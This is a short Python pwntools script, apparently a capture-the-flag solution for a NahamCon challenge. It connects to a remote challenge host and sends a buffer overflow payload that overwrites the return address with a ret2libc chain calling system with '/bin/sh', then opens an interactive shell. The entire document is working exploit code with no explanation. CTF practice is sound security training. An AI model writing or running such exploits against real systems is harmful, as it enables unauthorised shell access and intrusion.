```
from pwn import *


p = remote('challenge.nahamcon.com', 32008)
buffer = b"A"*16
ebp = b"B"*8

addr_system = p32(0xf7e04790)
binsh = p32(0xf7f51363)

payload = buffer + ebp + addr_system + b"AAAA" + binsh

p.sendline(payload)
p.interactive()
```
